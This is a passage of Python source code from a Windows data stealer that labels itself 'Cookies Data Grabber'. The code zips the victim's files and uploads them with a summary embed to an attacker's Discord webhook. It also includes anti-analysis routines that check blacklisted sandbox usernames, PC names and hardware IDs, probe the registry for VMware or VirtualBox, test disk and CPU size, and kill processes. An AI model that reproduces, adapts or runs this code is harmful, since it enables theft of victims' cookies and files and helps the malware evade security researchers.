            'avatar_url': 'https://cdn.discordapp.com/attachments/983370809500393514/983734590130782259/Pfp.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} Data',
                        'url': 'http://cookiesservices.xyz/',
                        'icon_url': 'https://cdn.discordapp.com/attachments/983370809500393514/983734590130782259/Pfp.gif'
                    },
                    'color': 16119101,
                    'description': 'Cookies Data Grabber',
                    'fields': [
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                    {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'Grabber By github.com/Callumgm'
                    }
                }
            ]
        }
        with open(_zipfile, 'rb') as f:
            if "api/webhooks" in self.webhook:
                httpx.post(self.webhook, json=embed)
                httpx.post(self.webhook, files={'upload_file': f})
            else:
                key = TOTP(self.fetchConf('webhook_protector_key')).now()
                httpx.post(self.webhook, headers={
                        "Authorization": key}, json=embed)
                httpx.post(self.webhook, headers={
                        "Authorization": key}, files={'upload_file': f})
        os.remove(_zipfile)


class AntiDebug(functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                                "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                                "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                                "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]

        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            os.system(f"taskkill /F /T /IM {proc}")
        except (PermissionError, InterruptedError, ChildProcessError, ProcessLookupError):
            pass

    def listCheck(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if os.path.exists(path):
                self.programExit()

        for user in self.blackListedUsers:
            if Victim == user:
                self.programExit()

        for pcName in self.blackListedPCNames:
            if Victim_pc == pcName:
                self.programExit()

        try:
            myHWID = subprocess.check_output(
                r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
        except Exception:
            myHWID = ""
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()

    def specsCheck(self):
        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
        if int(disk) <= 50:  # 50gb or less disc space
            self.programExit()
        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
            self.programExit()

    def registryCheck(self):
        reg1 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system(
            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]

            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)


if __name__ == "__main__" and os.name == "nt":	
    try:	
        httpx.get('https://google.com')	
    except httpx.ConnectTimeout:	
        os._exit(0)	
    asyncio.run(Cookies_Grabber().init())
